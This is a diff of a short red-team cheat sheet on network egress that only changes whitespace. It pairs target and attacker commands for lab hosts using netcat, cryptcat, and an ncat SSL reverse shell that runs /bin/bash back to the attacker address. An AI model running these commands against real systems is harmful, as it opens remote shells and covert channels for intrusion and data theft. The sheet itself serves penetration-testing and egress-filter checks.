@@ -1,21 +1,21 @@
 Egress
 
 
-target - Ubuntu		10.0.0.10
-target2 - Windows	10.0.0.11
-attacker		10.0.0.5
+target - Ubuntu     10.0.0.10
+target2 - Windows   10.0.0.11
+attacker            10.0.0.5
 
 # netcat
-target 			nc 10.0.0.5 80
-attacker 		nc -lvp 80
+target              nc 10.0.0.5 80
+attacker            nc -lvp 80
 
 # ncat
-target			ncat 10.0.0.5 --ssl -e /bin/bash
-attacker		ncat -l 443 --ssl
+target              ncat 10.0.0.5 --ssl -e /bin/bash
+attacker            ncat -l 443 --ssl
 
 # cryptcat
-target			cryptcat 10.0.0.5 80 -k password
-attacker		cryptcat -lvp 80 -k password
+target              cryptcat 10.0.0.5 80 -k password
+attacker            cryptcat -lvp 80 -k password
 
 # Egress-Assess
 
